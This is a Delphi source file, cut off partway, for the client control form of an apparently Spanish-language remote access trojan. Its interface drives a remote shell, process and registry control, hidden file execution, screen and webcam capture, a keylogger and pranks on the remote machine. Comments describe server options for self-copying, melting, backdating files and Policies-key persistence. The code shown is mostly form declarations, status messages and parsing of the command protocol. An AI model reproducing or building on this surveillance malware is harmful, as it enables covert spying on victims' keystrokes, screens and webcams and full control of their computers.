unit UnitFormControl;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, CommCtrl,
  Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, {ScktComp,} Jpeg,
   Spin, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase,
  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer, ShellAPI,ActiveX, gnugettext;

type
  TFormControl = class(TForm)
    PageControl: TPageControl;
    TabInfo: TTabSheet;
    TabManagers: TTabSheet;
    TabExtra: TTabSheet;
    TabFileManager: TTabSheet;
    DlgGuardar: TSaveDialog;
    PopupProcess: TPopupMenu;
    Cerrar1: TMenuItem;
    PopupWindows: TPopupMenu;
    Cerrar2: TMenuItem;
    Maximizar1: TMenuItem;
    Minimizar1: TMenuItem;
    Mostrar1: TMenuItem;
    Ocultar1: TMenuItem;
    Minimizartodas1: TMenuItem;
    BotnCerrarX1: TMenuItem;
    Activar1: TMenuItem;
    Desactivar1: TMenuItem;
    PopupFileManager: TPopupMenu;
    EjecutarAbrir1: TMenuItem;
    Normal1: TMenuItem;
    Oculto1: TMenuItem;
    Eliminar: TMenuItem;
    Cambiarnombre1: TMenuItem;
    Crearnuevacarpeta1: TMenuItem;
    PopupRegistro: TPopupMenu;
    Nuevo1:  TMenuItem;
    Clave1:  TMenuItem;
    N2:      TMenuItem;
    Valoralfanumrico1: TMenuItem;
    Valorbinerio1: TMenuItem;
    valorDWORD1: TMenuItem;
    Valordecadenamltiple1: TMenuItem;
    N3:      TMenuItem;
    N1:      TMenuItem;
    Eliminar1: TMenuItem;
    XPManifest: TXPManifest;
    StatusBar: TStatusBar;
    Enviarteclas1: TMenuItem;
    TimerCaptureScreen: TTimer;
    Descargarfichero1: TMenuItem;
    N4:      TMenuItem;
    PopupDescargas: TPopupMenu;
    Subir1:  TMenuItem;
    Bajar1:  TMenuItem;
    Subiralprimerpuesto1: TMenuItem;
    ltimopuesto1: TMenuItem;
    Borrarcompletados1: TMenuItem;
    Eliminardescarga1: TMenuItem;
    Subirfichero1: TMenuItem;
    OpenDialogUpload: TOpenDialog;
    PopupShell: TPopupMenu;
    Activar2: TMenuItem;
    DlgFont: TFontDialog;
    DlgColors: TColorDialog;
    Desactivar2: TMenuItem;
    N5:      TMenuItem;
    Guardarcmo1: TMenuItem;
    PopupServicios: TPopupMenu;
    Iniciar1: TMenuItem;
    DEtener1: TMenuItem;
    Desinstalar1: TMenuItem;
    Instalar1: TMenuItem;
    DetenerDescarga1: TMenuItem;
    ReanudarDescarga1: TMenuItem;
    Agregaracoladedescarga1: TMenuItem;
    N6:      TMenuItem;
    N7:      TMenuItem;
    Iralproceso1: TMenuItem;
    Previsualizarjpg1: TMenuItem;
    TimerCamCapture: TTimer;
    PopupGuardarPantallaoWebcam: TPopupMenu;
    Guardarimagen1: TMenuItem;
    Guardadoautomtico1: TMenuItem;
    IconsArchivos: TImageList;
    N9: TMenuItem;
    Abrircarpetadescargas1: TMenuItem;
    PrevisualizarImagenes1: TMenuItem;
    Portapapeles1: TMenuItem;
    Copiar1: TMenuItem;
    Pegar1: TMenuItem;
    N8: TMenuItem;
    BuscarArchivos1: TMenuItem;
    CambiarAtributos1: TMenuItem;
    Oculto2: TMenuItem;
    Sistema1: TMenuItem;
    Slolectura1: TMenuItem;
    PopupRutasRapidas: TPopupMenu;
    Windir1: TMenuItem;
    Directoriodesistema1: TMenuItem;
    Misdocumentos1: TMenuItem;
    Escritorio1: TMenuItem;
    ArchivosRecientes1: TMenuItem;
    Directoriodeinstalaciondecoolvibes1: TMenuItem;
    PageControlInformacion: TPageControl;
    TabSheetServidor: TTabSheet;
    TabSheetInfoSistema: TTabSheet;
    ListViewInformacion: TListView;
    ListViewServidor: TListView;
    ComboBoxGestionDeServidor: TComboBox;
    BtnEnviarComandoServidor: TSpeedButton;
    BtnActualizarServidorInfo: TSpeedButton;
    BtnRefrescarInformacion: TSpeedButton;
    PageControlArchivos: TPageControl;
    TabSheetVerArchivos: TTabSheet;
    BtnVerUnidades: TSpeedButton;
    LabelPathArchivos: TLabel;
    BtnActualizarArchivos: TSpeedButton;
    LabelNumeroDeCarpetas: TLabel;
    LabelNumeroDeArchivos: TLabel;
    SpeedButtonRutasRapidas: TSpeedButton;
    cmbUnidades: TComboBox;
    EditPathArchivos: TEdit;
    ListViewArchivos: TListView;
    TabSheetTransferencias: TTabSheet;
    LabelTransferencias: TLabel;
    ListViewDescargas: TListView;
    PageControlExtra: TPageControl;
    TabSheetMensajes: TTabSheet;
    TabSheetBromas: TTabSheet;
    ListViewBromas: TListView;
    BtnEnviarBromas: TSpeedButton;
    LabelTituloMensaje: TLabel;
    EditTituloMensaje: TEdit;
    MemoMensaje: TMemo;
    GrpBoxTipoMensaje: TGroupBox;
    ImgError: TImage;
    ImgAsterisk: TImage;
    ImgWarning: TImage;
    ImgInfo: TImage;
    RdBtnError: TRadioButton;
    RdBtnPregunta: TRadioButton;
    RdBtnExclamacion: TRadioButton;
    RdBtnInfo: TRadioButton;
    RdBtnVacio: TRadioButton;
    RdGrpBotonesMensaje: TRadioGroup;
    BtnEnviarMensaje: TSpeedButton;
    N10: TMenuItem;
    Refrescar1: TMenuItem;
    AbrirCarpetaDescargas2: TMenuItem;
    TabSheetBuscar: TTabSheet;
    ListViewBuscar: TListView;
    EditBuscar: TEdit;
    SpeedButtonBuscar: TSpeedButton;
    LabelNumeroEncontrados: TLabel;
    Abrirdirectorio1: TMenuItem;
    PageControlManagers: TPageControl;
    TabProcesos: TTabSheet;
    ListViewProcesos: TListView;
    BtnRefrescarProcesos: TSpeedButton;
    TabVentanas: TTabSheet;
    ListViewVentanas: TListView;
    CheckBoxMostrarVentanasOcultas: TCheckBox;
    BtnRefrescarVentanas: TSpeedButton;
    TabRegistro: TTabSheet;
    PanelRegistro: TPanel;
    Splitter1: TSplitter;
    TreeViewRegedit: TTreeView;
    ListViewRegistro: TListView;
    EditPathRegistro: TEdit;
    BtnVerRegisto: TSpeedButton;
    TabServicios: TTabSheet;
    ListViewServicios: TListView;
    MultiEditInstalarServicio: TEdit;
    btnInstServicios2: TSpeedButton;
    BtnCancelarInstalarServicio: TSpeedButton;
    BtnServicios: TSpeedButton;
    btnInstServicios: TSpeedButton;
    btnSiguienteInstalarServicio: TSpeedButton;
    TabPortapapeles: TTabSheet;
    MemoClipBoard: TMemo;
    SpeedButtonClipBoard1: TSpeedButton;
    SpeedButtonClipBoard2: TSpeedButton;
    TabShell: TTabSheet;
    MemoShell: TMemo;
    ComboBoxShellCommand: TComboBox;
    BtnCambiarFuenteShell: TSpeedButton;
    BtnCambiarColorShell: TSpeedButton;
    TabVigilancia: TTabSheet;
    PageControlVigilancia: TPageControl;
    TabScreencap: TTabSheet;
    TabWebcam: TTabSheet;
    TabKeylogger: TTabSheet;
    ScrollBoxCapScreenM: TScrollBox;
    imgCaptura: TImage;
    ProgressBarScreen: TProgressBar;
    LabelTamano: TLabel;
    LabelCalidadCapScreen: TLabel;
    TrackBarCalidad: TTrackBar;
    BtnCapturarScreen: TSpeedButton;
    CheckBoxAutoCapturaScreen: TCheckBox;
    SpinCaptureScreen: TSpinEdit;
    btnGuardarImagen: TSpeedButton;
    BtnVerGrandeCap: TSpeedButton;
    LabelPosicionCompresJpg: TLabel;
    CheckBoxMouseClicks: TCheckBox;
    CheckBoxTamanioReal: TCheckBox;
    ScrollBoxCapWebcam: TScrollBox;
    ImgWebcam: TImage;
    ProgressBarWebcam: TProgressBar;
    ComboBoxWebcam: TComboBox;
    LabelCalidadWebcam: TLabel;
    CheckBoxAutoCamCapture: TCheckBox;
    SpinCam: TSpinEdit;
    BtnCapturarWebcam: TSpeedButton;
    TrackBarCalidadWebcam: TTrackBar;
    BtnGuardarWebcam: TSpeedButton;
    BtnObtenerWebcams: TSpeedButton;
    LabelPosicionCompresJpgWebcam: TLabel;
    RichEditKeylogger: TRichEdit;
    EditLogName: TEdit;
    ProgressBarKeylogger: TProgressBar;
    SpeedButtonRecibirLog: TSpeedButton;
    SpeedButtonEliminarLog: TSpeedButton;
    SpeedButtonGuardarLog: TSpeedButton;
    CheckBoxOnlineKeylogger: TCheckBox;
    SpeedButtonActivarKeylogger: TSpeedButton;
    procedure FormCreate(Sender: TObject);
    procedure BtnRefrescarProcesosClick(Sender: TObject);
    procedure BtnRefrescarVentanasClick(Sender: TObject);
    procedure cmbUnidadesSelect(Sender: TObject);
    procedure ListViewArchivosDblClick(Sender: TObject);
    procedure Cerrar1Click(Sender: TObject);
    procedure Cerrar2Click(Sender: TObject);
    procedure Maximizar1Click(Sender: TObject);
    procedure Minimizar1Click(Sender: TObject);
    procedure Mostrar1Click(Sender: TObject);
    procedure Ocultar1Click(Sender: TObject);
    procedure Minimizartodas1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Oculto1Click(Sender: TObject);
    procedure EliminarClick(Sender: TObject);
    procedure Cambiarnombre1Click(Sender: TObject);
    procedure Crearnuevacarpeta1Click(Sender: TObject);
    procedure BtnRefrescarInformacionClick(Sender: TObject);
    procedure BtnActualizarArchivosClick(Sender: TObject);
    procedure BtnEnviarBromasClick(Sender: TObject);
    procedure BtnVerUnidadesClick(Sender: TObject);
    procedure TreeViewRegeditDblClick(Sender: TObject);
    procedure TreeViewRegeditChange(Sender: TObject; Node: TTreeNode);
    procedure BtnVerRegistoClick(Sender: TObject);
    procedure N1Click(Sender: TObject);
    procedure ListViewRegistroEdited(Sender: TObject; Item: TListItem;
      var S: string);
    procedure Eliminar1Click(Sender: TObject);
    procedure Valoralfanumrico1Click(Sender: TObject);
    procedure TreeViewRegeditContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: boolean);
    procedure ListViewRegistroContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: boolean);
    procedure Clave1Click(Sender: TObject);
    procedure ListViewArchivosContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: boolean);
    procedure ListViewArchivosEdited(Sender: TObject; Item: TListItem;
      var S: string);
    procedure Valorbinerio1Click(Sender: TObject);
    procedure valorDWORD1Click(Sender: TObject);
    procedure Valordecadenamltiple1Click(Sender: TObject);
    procedure BtnEnviarMensajeClick(Sender: TObject);
    procedure Activar1Click(Sender: TObject);
    procedure Desactivar1Click(Sender: TObject);
    procedure TrackBarCalidadChange(Sender: TObject);
    procedure BtnCapturarScreen1Click(Sender: TObject);
    procedure Enviarteclas1Click(Sender: TObject);
    procedure TrackBarCalidadWebcamChange(Sender: TObject);
    procedure BtnObtenerWebcamsClick(Sender: TObject);
    procedure BtnCapturarWebcamClick(Sender: TObject);
    procedure EnviarClickM(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: integer);
    procedure BtnActualizarServidorInfoClick(Sender: TObject);
    procedure BtnEnviarComandoServidorClick(Sender: TObject);
    procedure BtnVerGrandeCapClick(Sender: TObject);
    procedure TimerCaptureScreenTimer(Sender: TObject);
    procedure Descargarfichero1Click(Sender: TObject);
    procedure Borrarcompletados1Click(Sender: TObject);
    procedure ListViewDescargasContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: boolean);
    procedure ListViewDescargasCustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: integer; State: TCustomDrawState;
      var DefaultDraw: boolean);
    procedure Eliminardescarga1Click(Sender: TObject);
    procedure Subiralprimerpuesto1Click(Sender: TObject);
    procedure Subir1Click(Sender: TObject);
    procedure Bajar1Click(Sender: TObject);
    procedure ltimopuesto1Click(Sender: TObject);
    procedure Subirfichero1Click(Sender: TObject);
    procedure Activar2Click(Sender: TObject);
    procedure ComboBoxShellCommandKeyPress(Sender: TObject; var Key: char);
    procedure BtnCambiarFuenteShellClick(Sender: TObject);
    procedure BtnCambiarColorShellClick(Sender: TObject);
    procedure PopupShellPopup(Sender: TObject);
    procedure Desactivar2Click(Sender: TObject);
    procedure Guardarcmo1Click(Sender: TObject);
    procedure BtnServiciosClick(Sender: TObject);
    procedure DEtener1Click(Sender: TObject);
    procedure Iniciar1Click(Sender: TObject);
    procedure Desinstalar1Click(Sender: TObject);
    procedure Instalar1Click(Sender: TObject);
    procedure BtnCancelarInstalarServicioClick(Sender: TObject);
    procedure btnSiguienteInstalarServicioClick(Sender: TObject);
    procedure btnInstServiciosClick(Sender: TObject);
    procedure btnInstServicios2Click(Sender: TObject);
    procedure PopupDescargasPopup(Sender: TObject);
    procedure DetenerDescarga1Click(Sender: TObject);
    procedure ReanudarDescarga1Click(Sender: TObject);
    procedure ObteneryAniadirKeyloggerLog(AThread: TIdPeerThread; filesize: int64);
    function  ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64;var MS:Tmemorystream):string;
    procedure Agregaracoladedescarga1Click(Sender: TObject);
    procedure EditPathArchivosKeyPress(Sender: TObject; var Key: char);
    procedure ListViewProcesosCompare(Sender: TObject; Item1, Item2: TListItem;
      Data: integer; var Compare: integer);
    procedure ListViewRegistroCompare(Sender: TObject; Item1, Item2: TListItem;
      Data: integer; var Compare: integer);
    procedure ListViewProcesosColumnClick(Sender: TObject; Column: TListColumn);   //Desde FormBuscar
    procedure ListViewArchivosCompare(Sender: TObject; Item1, Item2: TListItem;Data: integer; var Compare: integer); //Desde formbuscar

    procedure Iralproceso1Click(Sender: TObject);
    procedure SpinCaptureScreenChange(Sender: TObject);
    procedure CheckBoxAutoCapturaScreenClick(Sender: TObject);
    procedure Previsualizarjpg1Click(Sender: TObject);
    procedure SpinCamChange(Sender: TObject);
    procedure CheckBoxAutoCamCaptureClick(Sender: TObject);
    procedure TimerCamCaptureTimer(Sender: TObject);
    procedure CheckBoxMostrarVentanasOcultasClick(Sender: TObject);
    procedure Guardarimagen1Click(Sender: TObject);
    procedure btnGuardarImagenClick(Sender: TObject);
    procedure PopupGuardarPantallaoWebcamPopup(Sender: TObject);
    procedure Guardadoautomtico1Click(Sender: TObject);
    procedure TabKeyloggerShow(Sender: TObject);
    procedure SpeedButtonRecibirLogClick(Sender: TObject);
    procedure SpeedButtonActivarKeyloggerClick(Sender: TObject);
    procedure SpeedButtonEliminarLogClick(Sender: TObject);
    procedure CheckBoxOnlineKeyloggerClick(Sender: TObject);
    procedure SpeedButtonGuardarLogClick(Sender: TObject);
    procedure TabServidorShow(Sender: TObject);
    procedure TabVentanasShow(Sender: TObject);
    procedure TabServiciosShow(Sender: TObject);
    procedure TabScreencapShow(Sender: TObject);
    procedure TabWebcamShow(Sender: TObject);
    procedure CheckBoxTamanioRealClick(Sender: TObject);
    procedure PrevisualizarImagenes1Click(Sender: TObject);
    procedure Copiar1Click(Sender: TObject);
    procedure Pegar1Click(Sender: TObject);
    procedure Abrircarpetadescargas1Click(Sender: TObject);
    procedure BuscarArchivos1Click(Sender: TObject);
    procedure ListViewArchivosCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure Oculto2Click(Sender: TObject);
    procedure Sistema1Click(Sender: TObject);
    procedure Slolectura1Click(Sender: TObject);
    procedure SpeedButtonRutasRapidasClick(Sender: TObject);
    procedure Windir1Click(Sender: TObject);
    procedure Directoriodesistema1Click(Sender: TObject);
    procedure Misdocumentos1Click(Sender: TObject);
    procedure Escritorio1Click(Sender: TObject);
    procedure ArchivosRecientes1Click(Sender: TObject);
    procedure Directoriodeinstalaciondecoolvibes1Click(Sender: TObject);
    procedure ComboBoxWebcamKeyPress(Sender: TObject; var Key: Char);
    procedure ListViewVentanasCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure TabSheetTransferenciasShow(Sender: TObject);
    procedure TabSheetServidorShow(Sender: TObject);
    procedure TabSheetInfoSistemaShow(Sender: TObject);
    procedure TabSheetVerArchivosShow(Sender: TObject);
    procedure Refrescar1Click(Sender: TObject);
    procedure SpeedButtonBuscarClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure ListViewBuscarContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure Abrirdirectorio1Click(Sender: TObject);
    procedure FormShortCut(var Msg: TWMKey; var Handled: Boolean);
    procedure TabSheetBuscarShow(Sender: TObject);
    procedure SpeedButtonClipBoard1Click(Sender: TObject);
    procedure SpeedButtonClipBoard2Click(Sender: TObject);
    procedure TabProcesosShow(Sender: TObject);

  private  //Funciones y variables privadas que solo podemos usar en este Form
    Servidor: TIdPeerThread;
    //Variables para recibir ficheros
    FormVisorDeMiniaturas: TObject;
    mslistviewitem : Tlistitem;
    RecibiendoFichero: boolean;
    NombreSI, DescripcionSI, RutaSI: string;//EnviarInstalarservicios
    Columna, ColumnaOrdenada: integer;
    PrefijoGuardarCaptura, PrefijoGuardarWebcam : string; //Para el guardado automático
    InumeroCaptura, InumeroWebcam : integer;
    PrevisualizacionActiva : boolean; //activada o desactivada la previsualización  de imagenes
    PortaPapeles : string;
    ReceivingThumbfile : boolean;
    IconosGrandes : TImageList;
    NumeroIconos : integer;
    MSGPosibles : array of string;
    function ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
    procedure AniadirClavesARegistro(Claves: string);
    procedure AniadirValoresARegistro(Valores: string);
    procedure UpdateProgressBarScreen;
    procedure agregardescargaencola(filename:string;tamano:integer);
    procedure CargarThumbsFileAlListview(thumbsfilepath:string);     //Funcion para mostrar imagenes de un archivo thumbs.db a el listview de archivos
    Function FileIconInit(FullInit: BOOL): BOOL; stdcall;
    procedure Cargariconos(primeravez : boolean);
    function IconNum(strExt: string): integer;
    procedure agregardescarga(filename:string);
    procedure TransferFinishedNotification(Sender: TObject;filename:string);
  public  //Funciones públicas que podemos llamar desde otros Forms
    NombrePC: string; //Nombre del PC remoto
    RecibiendoJPG : boolean; //Recibiendo captura? o camara o thumbnail  (se usa desde UnitVisorDeMiniaturas)
    AnchuraPantalla, AlturaPantalla : integer; //Altura y anchura de la pantalla del servidor
    AnchuraWebCam, AlturaWebCam : integer;     //Altura y anchura de la webcam del servidor
    FormVisorCaptura : TObject;
    constructor Create(aOwner: TComponent; AThread: TIdPeerThread); overload;
    procedure OnRead(command: string; AThread: TIdPeerThread); overload;
    procedure OnReadFile(AThread: TIdPeerThread); overload;
    procedure CrearDirectoriosUsuario();  //Es llamada tambien desde el visor de Thumbnails
    procedure pedirJPG(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
  end;

var
  FormControl: TFormControl;
  pctProgressBarScreen: integer;
  GenericBar:  TProgressBar;

implementation

uses UnitMain, UnitOpciones, UnitVisorDeMiniaturas,UnitTransfer,
     UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones,
     UnitVariables, AxThumbsDB, Storages;
     
{$R *.dfm}

Function TFormControl.FileIconInit(FullInit: BOOL): BOOL; stdcall;
type
TFileIconInit = function(FullInit: BOOL): BOOL; stdcall;
var
ShellDLL: HMODULE;
PFileIconInit: TFileIconInit;
begin
Result := False;
if (Win32Platform = VER_PLATFORM_WIN32_NT) then
begin
  ShellDLL := LoadLibrary(PChar('shell32.dll'));
  PFileIconInit := GetProcAddress(ShellDLL, PChar(660));
  if (Assigned(PFileIconInit)) then
    Result := PFileIconInit(FullInit);
end;
end;

constructor TFormControl.Create(aOwner: TComponent; AThread: TIdPeerThread);
begin
  inherited Create(aOwner);
  Servidor := AThread;
  FormVisorDeMiniaturas := nil;
end;

procedure TFormControl.FormCreate(Sender: TObject);
begin
    UseLanguage(Formmain.idioma);
    TranslateComponent(self);
      SetLength(MSGPosibles, 55);
      MSGPosibles[0] := _('De momento no funciona esta función :-)');
      MSGPosibles[1] := _('Hubo un problema al intentar auto-ejecutarse); la actualización se completara en el siguiente reinicio');
      MSGPosibles[2] := _('Proceso matado con PID ');
      MSGPosibles[3] := _(' :( No pude matar el proceso con PID ');
      MSGPosibles[4] := _('Ventana cerrada con Handle ');
      MSGPosibles[5] := _('Ventana maximizada con Handle ');
      MSGPosibles[6] := _('Ventana minimizada con Handle ');
      MSGPosibles[7] := _('Ventana mostrada con Handle ');
      MSGPosibles[8] := _('Ventana ocultada con Handle ');
      MSGPosibles[9] := _('Minimizadas todas las ventanas.');
      MSGPosibles[10] := _('Se activó el botón Cerrar [X] en la ventana con Handle ');
      MSGPosibles[11] := _('Se desactivó el botón Cerrar [X] en la ventana con Handle ');
      MSGPosibles[12] := _('No se pudieron enviar las teclas a la ventana con handle ');
      MSGPosibles[13] := _('Se enviaron las teclas a la ventana con handle ');
      MSGPosibles[14] := _('El usuario respondió: OK');
      MSGPosibles[15] := _('El usuario respondió: Cancelar');
      MSGPosibles[16] := _('El usuario respondió: Reintentar');
      MSGPosibles[17] := _('El usuario respondió: Sí');
      MSGPosibles[18] := _('El usuario respondió: No');
      MSGPosibles[19] := _('El usuario respondió: Anular');
      MSGPosibles[20] := _('El usuario respondió: Omitir');
      MSGPosibles[21] := _('Archivo correctamente ejecutado :).');
      MSGPosibles[22] := _('Se produjo algún error al ejecutar el archivo.');
      MSGPosibles[23] := _('Archivo correctamente ejecutado de manera oculta :).');
      MSGPosibles[24] := _('Se produjo algún error al ejecutar el archivo de manera oculta.');
      MSGPosibles[25] := _('El archivo fue borrado con éxito.');
      MSGPosibles[26] := _('El archivo no se pudo borrar.');
      MSGPosibles[27] := _('El archivo no existe. Tal vez ya fue borrado.');
      MSGPosibles[28] := _('La carpeta fue borrada con éxito.');
      MSGPosibles[29] := _('No se pudo borrar la carpeta.');
      MSGPosibles[30] := _('La carpeta no existe. Tal vez ya fue borrada.');
      MSGPosibles[31] := _('Archivo o carpeta renombrada con éxito.');
      MSGPosibles[32] := _('No se pudo renombrar el archivo o la carpeta.');
      MSGPosibles[33] := _('El archivo o la carpeta no existe.');
      MSGPosibles[34] := _('Carpeta creada con éxito.');
      MSGPosibles[35] := _('No se pudo crear la carpeta.');
      MSGPosibles[36] := _('La carpeta ya existe); no es necesario crearla.');
      MSGPosibles[37] := _('Archivo copiado con éxito');
      MSGPosibles[38] := _('Error al copiar el archivo');
      MSGPosibles[39] := _('Modificado nombre de clave con éxito.');
      MSGPosibles[40] := _('Error al modificar el nombre de la clave.');
      MSGPosibles[41] := _('Clave o Valor eliminado con éxito.');
      MSGPosibles[42] := _('No se pudo eliminar la clave o el valor.');
      MSGPosibles[43] := _('Clave añadida con éxito.');
      MSGPosibles[44] := _('No se pudo añadir la clave.');
      MSGPosibles[45] := _('Valor añadido con éxito.');
      MSGPosibles[46] := _('No se pudo añadir el valor.');
      MSGPosibles[47] := _('Se ha intentado iniciar el servicio');
      MSGPosibles[48] := _('Se ha intentado detener el servicio');
      MSGPosibles[49] := _('Se ha intentado desinstalar el servicio');
      MSGPosibles[50] := _('Se ha intentado instalar el servicio');
      MSGPosibles[51] := _('Log eliminado con éxito');
      MSGPosibles[52] := _('Online Keylogger activado con éxito');
      MSGPosibles[53] := _('Online Keylogger desactivado con éxito');
      MSGPosibles[54] := _('Seteado portapapeles con éxito');
      

    self.DoubleBuffered := True;  //Evita parpadeos
    recibiendofichero := false;
    CargarIconos(true);
    self.Height := 457;//Altura Predeterminada
    self.Width := 440; //Anchura predeterminada
    if FormMain.ControlWidth > 0 then
      self.Width := FormMain.ControlWidth;
    if FormMain.ControlHeight > 0 then
      self.Height := FormMain.ControlHeight;
    self.Position := poDesktopCenter; //Posición predeterminada
    PageControl.ActivePage := TabInfo; //iniciamos siempre en este tab
    PageControlInformacion.ActivePage := TabSheetServidor;
    PageControlArchivos.ActivePage := TabSheetVerArchivos;
    PageControlManagers.ActivePage := TabProcesos;
    PageControlVigilancia.ActivePage := TabScreencap;
end;

procedure TFormControl.Cargariconos(primeravez : boolean);
var
  vFileInfo: TSHFileInfo;
  Fileinfo : SHFILEINFO;
  vImgList : THandle;
  TmpIconosGrandes,Tmp2IconosGrandes: TImageList;
  bit, nbit : TBitmap;
  i , tmpint, tmpint2,o: integer;
  t : boolean;
begin
//Creación de iconos
  FileIconInit(true);
  if primeravez then
  begin
    {Iconos pequeños para vsreport}
    vImgList := SHGetFileInfo(nil,FILE_ATTRIBUTE_NORMAL,vFileInfo,SizeOf(vFileInfo),SHGFI_ICON or SHGFI_SMALLICON or SHGFI_SYSICONINDEX);
    SendMessage(listviewarchivos.Handle, LVM_SETIMAGELIST, LVSIL_SMALL , vImgList);
    SendMessage(listviewBuscar.Handle, LVM_SETIMAGELIST, LVSIL_SMALL , vImgList);
    DestroyIcon(vFileInfo.hIcon);

  end;

    {Iconos grandes para thumbnails}
    if primeravez then
    begin
      numeroiconos := 0;
      IconosGrandes := TImageList.Create(nil);
      IconosGrandes.width := 96;   {96x96, se puede cambiar si se desea}
      IconosGrandes.height := 96;
    end
    else
    begin
      numeroiconos := 0;
      IconosGrandes.Clear;
    end;

    for o := 0 to listviewarchivos.items.count-1 do //Para agregar los nuevo iconos que necesitemos
      SHGetFileInfo(PChar(UpperCase(ExtractFileExt(listviewarchivos.items[o].caption))),FILE_ATTRIBUTE_NORMAL,FileInfo,SizeOf(FileInfo),SHGFI_ICON  or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
    
    TmpIconosGrandes := TImageList.Create(nil);  {Estos son de 32x32 y hay que redimensionarlos}
    vImgList := SHGetFileInfo('',FILE_ATTRIBUTE_NORMAL,FileInfo,SizeOf(FileInfo),SHGFI_ICON or SHGFI_LARGEICON or SHGFI_SYSICONINDEX or  SHGFI_USEFILEATTRIBUTES);
    DestroyIcon(FileInfo.hIcon);
    TmpIconosGrandes.Handle := vImgList;
    TmpIconosGrandes.ShareImages := true;
    Tmp2IconosGrandes := TImageList.Create(nil);
    Tmp2IconosGrandes.width := IconosGrandes.width;   {96x96, se puede cambiar si se desea}
    Tmp2IconosGrandes.height := IconosGrandes.height;
    for i:= 0 to TmpIconosGrandes.Count-1 do    //tenemos que redimensionar los iconos del sistema
    begin
      try
        //sleep(10);  //si no se pone este sleep algunas veces no cargan todos los iconos
        bit := tbitmap.create();
        nbit := tbitmap.create();
        TmpIconosGrandes.GetBitmap(i,bit);
        nbit.Width := Tmp2IconosGrandes.width;
        nbit.Height := Tmp2IconosGrandes.height;

                                       //centramos el icono
        tmpint := (nbit.height-bit.height) div 2;//"top" de la esquina sup izq
        tmpint2 := (nbit.width-bit.width) div 2; //"left" de la esquina sup izq
        StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, Bit.Width, Bit.Height, Bit.Canvas.Handle, 0, 0,Bit.Width, Bit.Height, SRCCOPY);

      Tmp2IconosGrandes.Add(nbit,nil);
      finally
        bit.free;
        nbit.free;
        bit := nil;
        nbit := nil;
      end;
  end;
  IconosGrandes.Handle := Tmp2IconosGrandes.handle;
   if primeravez then
    listviewarchivos.LargeImages := IconosGrandes;
end;

procedure TFormControl.OnRead(command: string; AThread: TIdPeerThread);
var
  Recibido, TempStr: string;
  Item:     TListItem;
  i, a:     integer;
  RealSize: string;
begin
  Recibido := Command;
  // FormMain.Caption := Recibido; //Para debug
  if Recibido = 'CONNECTED?' then
    Exit;
  if Pos('CONNECTED?', Recibido) > 0 then
    Delete(Recibido, Pos('CONNECTED?', Recibido), Length('CONNECTED?'));
  //Borra la String 'CONNECTED?'

  if Copy(Recibido, 1, 4) = 'PING' then
  begin
    Servidor.Connection.Writeln('PONG');
  end;

  if Copy(Recibido, 1, 4) = 'INFO' then
  begin
    Delete(Recibido, 1, 5);  //Borramos INFO|
    for i := 0 to 9 do  //10 items
    begin
      if i = 9 then  //Tamaño de los discos duros recibido en bytes
        ListViewInformacion.Items[i].SubItems[0] :=
          ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, Pos('|', Recibido) - 1)))
      else
        ListViewInformacion.Items[i].SubItems[0] :=
          Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    BtnRefrescarInformacion.Enabled := true;
  end;

  //Comandos relacionados con la gestión del servidor
  if Copy(Recibido, 1, 8) = 'SERVIDOR' then
  begin
    Delete(Recibido, 1, 9);
    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el comando
    Delete(Recibido, 1, Pos('|', Recibido));
    //Información específica del servidor
    if TempStr = 'INFO' then
    begin
      with ListViewServidor do
      begin
        //Versión
        Items[0].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
        Delete(Recibido, 1, Pos('|', Recibido));
        //Nombre
        Items[1].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
        Delete(Recibido, 1, Pos('|', Recibido));

        Items[3].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
        Delete(Recibido, 1, Pos('|', Recibido));

        for i := 5 to 9 do
        begin
          //bCopiar, NombreDeArchivo, Copiar a, melt, CopiarConFechaAnterior
          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
        for i := 11 to 12 do
        begin
          //bPolicies, Nombre de la clave de Policies
          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
        for i := 14 to 15 do
        begin
          //bPolicies, Nombre de la clave de Policies
          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
        end;

        //Ruta del servidor
        Items[17].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
        Delete(Recibido, 1, Pos('|', Recibido));
      end;
      BtnActualizarServidorInfo.enabled := true;
    end;
  end;

  //Listar Procesos
  if Copy(Recibido, 1, 4) = 'PROC' then
  begin
    ListViewProcesos.Clear;
